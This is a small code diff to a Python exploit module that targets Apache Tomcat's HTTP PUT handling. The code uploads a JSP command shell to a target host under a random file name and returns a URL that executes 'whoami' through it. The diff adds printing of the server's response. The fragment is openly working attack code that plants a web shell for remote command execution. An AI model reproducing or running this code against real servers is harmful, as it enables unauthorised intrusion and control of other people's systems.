@@ -50,7 +50,8 @@ class TomcatPutExploitSubServiceClass(BaseSubServiceClass):
         verbose = kwargs.get("verbose", False)
 
         s = generate_random_string()
-        requests.put(f"http://{host}/{s}.jsp", verify=False, data=cmd_jsp)
+        resp = requests.put(f"http://{host}/{s}.jsp", verify=False, data=cmd_jsp)
+        print(resp.text)
 
         return f"http://{host}/{s}.jsp?cmd=whoami"
 
